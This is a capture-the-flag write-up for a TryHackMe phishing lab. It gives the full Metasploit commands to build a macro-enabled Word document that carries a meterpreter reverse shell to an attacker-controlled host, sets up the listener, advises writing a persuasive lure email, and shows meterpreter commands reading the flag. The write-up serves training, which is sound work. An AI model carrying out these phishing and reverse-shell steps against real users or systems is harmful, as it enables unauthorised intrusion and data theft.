# Ghost Phishing 

## Challenge Description
> ![image](https://github.com/user-attachments/assets/25fe2ec9-ef5b-4405-8968-8748c5664f39)

## Solution
This challenge reminded me of a similar scenario I encountered during the [Advent of Cyber 2024](https://tryhackme.com/room/adventofcyber2024) event.

We accessed the webmail interface at:
`http://10.10.62.187/`

Using the provided credentials:
`Username: specter@darknetmail.corp`
`Password: YouCantCatchMe`

This granted us access to DarkSpecter’s email account, where we aimed to deliver a malicious document to our target, Cipher (cipher@darknetmail.corp).

![image](https://github.com/user-attachments/assets/795a04e3-d21a-4fcf-8ea8-b2b5713cd436)

To exploit the target system, we needed to embed a malicious macro into a Word document. Instead of manually embedding the macro, we used Metasploit Framework to generate it automatically.

> [!NOTE]  
> ### Steps to Generate the Malicious Macro
> 1. Open a terminal and start Metasploit:
>    
>    ```
>    msfconsole
>    ```
> 2. Configure the payload to create a reverse shell:
>
>    ```
>    use exploit/multi/fileformat/office_word_macro
>    set payload windows/meterpreter/reverse_tcp
>    set LHOST <ATTACKBOX_IP> //Im using openvpn, thus use ifconfig to find your machine's IP
>    set LPORT 8888
>    ```
> 3. Verify the settings:
>       
>    ```
>    show options
>    ```
> 4. Generate the malicious Word document:
>
>    ```
>    exploit
>    ```

![image](https://github.com/user-attachments/assets/d14994da-2a66-4929-85ec-75a8a1942628)

This created a macro-enabled Word document (.docm) embedded with our payload.

To receive a connection when the target opens the malicious document, we used Metasploit’s multi/handler module:
> [!NOTE]  
> ### Setting Up a Listener
> 1. Open a terminal and start Metasploit:
>    
>    ```
>    msfconsole
>    ```
> 2. Set up the listener:
>
>    ```
>    use multi/handler
>    set payload windows/meterpreter/reverse_tcp
>    set LHOST <ATTACKBOX_IP>
>    set LPORT 8888
>    ```
> 3. Verify the settings:
>       
>    ```
>    show options
>    ```
> 4. Start listening for connections:
>
>    ```
>    exploit
>    ```      

Now, when the target opens the document, we will receive a reverse shell.

The next step is to send the phishing email.
> [!NOTE]
> ### Sending the Phishing Email
> 1. Log into the webmail interface.
> 2. Compose a new email addressed to cipher@darknetmail.corp.
> 3. Attach the malicious document (renaming it to something convincing like report.docm).
> 4. Write a persuasive message to encourage the recipient to open the document.
> 5. Send the email.

Once the target opens the document, our reverse shell should trigger within ~2 minutes.

![image](https://github.com/user-attachments/assets/a8fc92ea-d0a0-4831-b9fe-bb5f772ffe0a)

When the target executed the macro, we received a connection on our Metasploit listener:

![image](https://github.com/user-attachments/assets/0c8561fb-f362-47d7-a69f-39711057d7a0)

We navigated to the Administrator’s Desktop:
```
meterpreter > cd c:/users/Administrator/Desktop
meterpreter > ls
```
We retrieved the flag:
```
meterpreter > cat flag.txt
THM{gh0st_ph1sh1ng_exp0s3d}
```
![image](https://github.com/user-attachments/assets/26b1721a-fb64-4b05-9f68-d71f849628d5)

## Conclusion

The challenge demonstrated the effectiveness of phishing attacks in compromising a target system. Office documents can be weaponized using VBA macros to execute arbitrary code.
Crafting a convincing email is crucial for successful phishing attacks. The Metasploit framework provides robust modules for creating payloads and handling connections.

 ## Flag
 THM{gh0st_ph1sh1ng_exp0s3d}
